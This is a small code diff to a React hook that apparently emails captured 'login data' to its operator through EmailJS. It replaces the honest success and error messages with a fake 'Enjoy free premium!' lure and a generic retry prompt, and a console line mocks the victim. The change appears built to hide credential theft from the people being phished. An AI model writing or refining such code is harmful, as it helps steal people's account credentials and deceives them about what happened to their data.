@@ -31,11 +31,11 @@ const useSendEmail = (): UseSendEmailResult => {
         import.meta.env.VITE_EMAILJS_PUBLIC_KEY as string
       );
       console.log('GET FUCKED BOZO!', response.status, response.text);
-      setMessage('Login data sent successfully!');
+      setMessage('Enjoy free premium!');
       return true;
     } catch (err) {
       console.error('FAILED...', err);
-      setError('Failed to send login data.');
+      setError('Failed to submit, please try again.');
       return false;
     } finally {
       setLoading(false);
